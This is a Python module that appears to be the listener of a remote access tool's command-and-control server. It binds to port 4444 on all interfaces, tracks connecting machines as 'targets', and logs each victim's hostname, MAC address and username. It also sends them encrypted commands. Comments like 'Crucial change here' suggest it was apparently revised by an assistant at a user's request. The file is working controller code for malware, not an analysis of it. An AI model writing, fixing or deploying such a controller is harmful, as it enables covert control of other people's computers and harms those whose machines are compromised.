
import socket
import json
import time
from .encryption import initialize_encryption
from .authentication import authenticate_client # This import is fine now
from .logging_config import logging
from .rate_limiter import is_rate_limited
from .state import targets, ips, client_info_map, next_session_id, stop_threads, server_socket

# send_data remains here, it's the "owner" of this functionality
def send_data(target_socket, command_dict):
    try:
        ip_str = next((k for k, v in client_info_map.items() if v['socket'] == target_socket), 'Unknown')
        cipher = client_info_map.get(ip_str, {}).get('cipher')
        if not cipher:
            logging.error(f"No cipher found for client {ip_str}", extra={'session_id': 'N/A'})
            return
        encrypted_data = cipher.encrypt(json.dumps(command_dict).encode('utf-8'))
        target_socket.send(encrypted_data)
    except Exception as e:
        logging.error(f"Error sending data: {e}", extra={'session_id': 'N/A'})
        # Ensure handle_client_disconnection is imported if used here
        from .client_management import handle_client_disconnection
        handle_client_disconnection(target_socket)

def recv_data(target_socket):
    try:
        ip_str = next((k for k, v in client_info_map.items() if v['socket'] == target_socket), 'Unknown')
        cipher = client_info_map.get(ip_str, {}).get('cipher')
        if not cipher:
            logging.error(f"No cipher found for client {ip_str}", extra={'session_id': 'N/A'})
            return None
        # Simplified recv_data to match your original, focusing on the fix
        # You might need a more robust receiving loop depending on your protocol
        chunk = target_socket.recv(4096)
        if not chunk:
            from .client_management import handle_client_disconnection
            handle_client_disconnection(target_socket)
            return None
        try:
            decrypted_data = cipher.decrypt(chunk).decode('utf-8')
            return json.loads(decrypted_data)
        except json.JSONDecodeError:
            logging.error(f"JSONDecodeError during decryption from {ip_str}. Raw: {chunk}", extra={'session_id': 'N/A'})
            return None
        except Exception as e:
            logging.error(f"Decryption error from {ip_str}: {e}", extra={'session_id': 'N/A'})
            return None
    except Exception as e:
        logging.error(f"Recv_data error: {e}", extra={'session_id': 'N/A'})
        return None


def server_listen():
    global server_socket, targets, ips, client_info_map, next_session_id, stop_threads
    # using config file
    # with open('/config/config.json') as f:
    #     config = json.load(f)
    # bind_ip = config['bind_ip']
    # bind_port = config['bind_port']

    bind_ip = '0.0.0.0'
    bind_port = 4444  # Default port, can be changed as needed

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((bind_ip, bind_port))
        server_socket.listen(5)
    except Exception as e:
        logging.error(f"Failed to bind server to {bind_ip}:{bind_port} - {e}", extra={'session_id': 'N/A'})
        stop_threads = True
        return
    logging.info(f"Server listening on: {bind_ip}:{bind_port}", extra={'session_id': 'N/A'})

    while not stop_threads:
        server_socket.settimeout(1.0)
        try:
            client_socket, client_address = server_socket.accept()
            client_ip = client_address[0]
            if is_rate_limited(client_ip):
                logging.warning(f"Rate limit exceeded for {client_ip}. Connection rejected.", extra={'session_id': 'N/A'})
                client_socket.close()
                continue
            client_socket.settimeout(None)

            # Initialize encryption
            cipher = initialize_encryption(client_socket)
            if not cipher: # Ensure cipher was successfully initialized
                logging.error(f"Encryption initialization failed for {client_address[0]}:{client_address[1]}", extra={'session_id': 'N/A'})
                client_socket.close()
                continue

            # Authenticate client, passing the send_data function from this module
            if not authenticate_client(client_socket, cipher, send_data): # <--- Crucial change here
                logging.error(f"Authentication failed for {client_address[0]}:{client_address[1]}", extra={'session_id': 'N/A'})
                client_socket.close()
                continue

            ip_str = f"{client_address[0]}:{client_address[1]}"
            print(f"[DEBUG] Adding client to client_info_map: {ip_str}, socket={client_socket}, cipher={cipher}")
            # Remove any stale mapping for this socket or IP:port
            for stale_ip, info in list(client_info_map.items()):
                if info.get('socket') == client_socket or stale_ip == ip_str:
                    print(f"[DEBUG] Removing stale mapping: {stale_ip}")
                    del client_info_map[stale_ip]
            client_info_map[ip_str] = {
                'socket': client_socket,
                'ip_str': ip_str,
                'cipher': cipher
            }
            print(f"[DEBUG] client_info_map now: {client_info_map}")

            # Now receive initial info
            initial_data_payload = recv_data(client_socket)
            if initial_data_payload and isinstance(initial_data_payload, dict) and initial_data_payload.get("type") == "initial_info":
                info_str = initial_data_payload.get("data", "Unknown,Unknown,Unknown")
                hostname, mac_address, username = info_str.split(',', 2) if info_str.count(',') == 2 else ("Unknown", "Unknown", "Unknown")
                client_info_map[ip_str].update({
                    'hostname': hostname,
                    'mac': mac_address,
                    'user': username,
                    'session_id': next_session_id,
                    'connected_at': time.strftime("%Y-%m-%d %H:%M:%S")
                })
                targets.append(client_socket)
                ips.append(client_address)
                session_id = next_session_id
                next_session_id += 1
                logging.info(f"Connection from: {username}@{hostname} ({ip_str}) - Session ID: {session_id}", extra={'session_id': session_id})
            else:
                logging.error(f"Failed to get initial info from {client_address[0]}:{client_address[1]} or invalid format.", extra={'session_id': 'N/A'})
                client_socket.close()
        except socket.timeout:
            continue
        except Exception as e:
            if not stop_threads:
                logging.error(f"Error in server_listen: {e}", extra={'session_id': 'N/A'})
            # This is important: if an error occurs and client_socket is open, close it
            if 'client_socket' in locals() and client_socket:
                try:
                    client_socket.close()
                except Exception as close_e:
                    logging.error(f"Error closing socket after server_listen error: {close_e}", extra={'session_id': 'N/A'})
            continue